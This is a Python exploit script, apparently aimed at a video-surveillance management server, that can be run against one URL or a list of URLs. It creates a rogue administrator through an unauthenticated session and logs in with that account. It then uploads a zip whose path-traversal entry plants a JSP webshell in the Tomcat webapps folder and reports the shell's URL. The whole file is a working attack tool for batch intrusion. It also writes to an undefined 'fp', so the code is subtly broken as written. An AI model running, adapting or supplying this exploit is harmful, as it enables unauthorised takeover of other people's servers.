from email.mime import base
from collections import OrderedDict
from urllib.parse import urlparse
from weakref import proxy
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import zipfile
import urllib3
import argparse
import operator
import base64
import random
import hashlib
import os
import re
import requests
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Accept-Encoding": "gzip, deflate"
    }

def randomLetter():
    random_letters = ""
    for _ in range(8):
        random_letter = chr(random.randint(97,122))
        random_letters += random_letter
    return random_letters

def zip():
    try:
        with open("shell.jsp", "r") as f:
            shellPath = randomLetter()
            zipPath = "../../../../../../../../../../../../../opt/tomcat/webapps/upload/"+shellPath+".jsp"
            binary = f.read()
            zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
            info = zipfile.ZipInfo("test.zip")
            #zipFile.writestr("../../../../../data/data/com.test.demo/files/test.txt", binary)
            zipFile.writestr(zipPath, binary)
            zipFile.close()
        return shellPath
    except IOError as e:
        raise e

def removeZip():
    try:
        if os.path.exists("test.zip"):
            os.remove("test.zip")
    except IOError as e:
        raise e

    
def encrypt_pass(publicKey,password):
    publickey = '-----BEGIN PUBLIC KEY-----\n' + publicKey + '\n-----END PUBLIC KEY-----'
    rsakey = RSA.importKey(publickey)
    cipher = PKCS1_v1_5.new(rsakey)
    password = str(password)
    result = base64.b64encode(cipher.encrypt(password.encode('utf-8')))
    return result.decode('utf-8')

def encrypt_md5(str):
    md5 = hashlib.md5()
    md5.update(str.encode('utf-8'))
    result = md5.hexdigest()
    return result

def exp(url):
    try:
        response_sso_initSession = requests.get(url+"/admin/sso_initSession.action",headers=header,verify=False,timeout=5)
    except requests.RequestException:
        return 1
    if response_sso_initSession.status_code != 200:
        return 1
    
    sessionOne = response_sso_initSession.text.strip()
    userName = randomLetter()
    password = randomLetter()
    fp.write(userName)
    fp.close()
    header_user_save = {    
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Accept-Encoding": "*",
        "Cookie":"JSESSIONID="+sessionOne}
    data_user_save = {
        'userBean.userType':(None,'0'),
        'userBean.ownerCode':(None,'001'),
        'userBean.isReuse':(None,'1'),
        'userBean.macStat':(None,'0'),
        'userBean.roleIds':(None,'1'),
        'userBean.loginName':(None,userName),
        'displayedOrgName':(None,userName),
        'userBean.loginPass':(None,password),
        'checkPass':(None,password),
        'userBean.groupId':(None,'0'),
        'userBean.userName':(None,userName)
    }
    try:
        response_user_save = requests.post(url+"/admin/user_save.action",headers=header_user_save,verify=False,files=data_user_save)
    except requests.RequestException:
        return 1
    if response_user_save.status_code != 200:
        return 1
    header_getpublicKey= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json"
    }
    data_getpublicKey = {"loginName":userName}
    try:
        response_getpublicKey = requests.post(url+"/WPMS/getPublicKey",headers=header_getpublicKey,verify=False,data=json.dumps(data_getpublicKey))
    except requests.RequestException:
        return 1
    if response_getpublicKey.status_code != 200 or not operator.contains(response_getpublicKey.text,'"publicKey"') :
        return 1
    rsapublicKey = json.loads(response_getpublicKey.text).get("publicKey")
    password_login = encrypt_pass(rsapublicKey,password)
    header_login= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json"
    }
    data_login = {"loginName":userName,"loginPass":password_login}
    try:
        response_login = requests.post(url+"/WPMS/login",headers=header_login,verify=False,data=json.dumps(data_login))
    except requests.RequestException:
        return 1
    if response_login.status_code != 200 or not operator.contains(response_login.text,'"token"') :
        return 1
    token_login_login = json.loads(response_login.text).get("token")
    try:
        response_login_login = requests.get(url+"/admin/login_login.action?subSystemToken="+token_login_login,headers=header,verify=False)
    except requests.RequestException:
        return 1
    if response_login_login.status_code != 200:
        return 1
    Jsessionid = re.match("JSESSIONID=(.*?);",response_login_login.headers.get("Set-Cookie")).group()
    header_recover_recover = {
        "Cookie":Jsessionid+" currentToken="+token_login_login,
        "Accept-Encoding": "gzip, deflate"
        }
    passwordtoken = encrypt_md5(userName+":dss:"+password)
    removeZip()
    shellPath = zip()
    file_recover_recover = [("recoverFile",("test.zip",open("test.zip","rb").read(),"application/zip"))]
    try:
        response_recover_recover = requests.post(url+"/admin/recover_recover.action?password="+passwordtoken,headers=header_recover_recover,files=file_recover_recover,verify=False)
    except requests.RequestException:
        return 1
    if response_recover_recover.status_code != 200:
        return 1
    try:
        response_last = requests.post(url+"/upload/"+shellPath+".jsp",headers=header,verify=False)
    except requests.RequestException:
        return 1
    if response_last.status_code == 404:
        return 1
    else:
        webshell = url+"/upload/"+shellPath+".jsp"
        return webshell

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", help = "目标URL")
    parser.add_argument('-f', "--file", help = "批量url文件")
    args = parser.parse_args()
    if args.url:
        parsed_url = urlparse(args.url)
        urlp = parsed_url.scheme + "://" + parsed_url.netloc
        print('\033[0;31;46m开始测试'+urlp+'\033[0m')
        result = exp(urlp)
        if result != 1:
            print("\033[0;31;107msuccess[+]:"+result+'\033[0m')
        else:
            print("\033[0;94;107mnovul\033[0m")
    elif args.file:
        for url in open(args.file):
            parsed_url = urlparse(url.strip())
            urlp = parsed_url.scheme + "://" + parsed_url.netloc
            print('\033[0;31;46m开始测试'+urlp.strip()+'\033[0m')
            result = exp(urlp)
            if result != 1:
                print("\033[0;31;107msuccess[+]:"+result+'\033[0m')
            else:
                print("\033[0;94;107mnovul\033[0m")